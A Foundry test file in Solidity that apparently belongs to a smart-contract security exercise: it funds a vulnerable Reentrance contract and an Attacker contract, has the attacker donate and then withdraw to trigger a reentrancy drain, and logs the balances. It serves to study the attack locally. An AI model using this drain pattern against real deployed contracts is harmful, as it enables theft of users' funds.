// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Reentrance} from "../src/Reentrance.sol";
import {Attacker} from "../src/Attacker.sol";

contract ReentranceTest is Test {

    Reentrance reentrance;
    Attacker attacker;

    function setUp() public {
        reentrance = new Reentrance();
        attacker = new Attacker();
        vm.deal(address(reentrance), 10 ether);
        vm.deal(address(attacker), 2 ether);
    }

    function test_Reentrancy() public {
        console.log("---Attacker donating to the contract address---");
        vm.prank(address(attacker));
        reentrance.donate{value: 1 ether}(address(attacker));
        console.log("Contract balance: ", address(reentrance).balance);
        console.log("Attacker balance: ", address(attacker).balance);
        console.log("------");
        console.log("---Attacker executing reentrancy attack---");
        vm.prank(address(attacker));
        reentrance.withdraw(1 ether);
        console.log("Contract balance: ", address(reentrance).balance);
        console.log("Attacker balance: ", address(attacker).balance);

    }

}
